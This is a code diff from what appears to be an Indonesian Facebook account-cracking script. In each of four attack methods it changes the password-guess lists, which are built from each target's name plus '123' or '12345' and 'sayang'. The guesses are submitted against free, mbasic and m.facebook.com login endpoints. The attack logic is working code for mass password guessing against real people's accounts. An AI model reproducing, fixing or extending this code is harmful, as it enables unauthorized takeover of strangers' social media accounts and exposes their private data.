@@ -292,13 +292,11 @@ def method():
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					else:
-						pwx = [ name+"123", name+"12345" ]
-					else:
-						pwx = [ "sayang" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					coeg.submit(api, uid, pwx)
 			exit("\n\n [#] crack selesai...")
 	elif method == "2":
@@ -325,13 +323,11 @@ def method():
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					else:
-						pwx = [ name+"123", name+"12345" ]
-					else:
-						pwx = [ "sayang" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					coeg.submit(crack, uid, pwx, "https://free.facebook.com")
 			exit("\n\n [#] crack selesai...")
 	elif method == "3":
@@ -358,13 +354,11 @@ def method():
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					else:
-						pwx = [ name+"123", name+"12345" ]
-					else:
-						pwx = [ "sayang" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
 			exit("\n\n [#] crack selesai...")
 	elif method == "4":
@@ -391,13 +385,11 @@ def method():
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
-						pwx = [ name+"123", name+"12345" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					else:
-						pwx = [ name+"123", name+"12345" ]
-					else:
-						pwx = [ "sayang" ]
+						pwx = [ name+"123", name+"12345", sayang ]
 					coeg.submit(crack, uid, pwx, "https://m.facebook.com")
 			exit("\n\n [#] crack selesai...")
 		else:
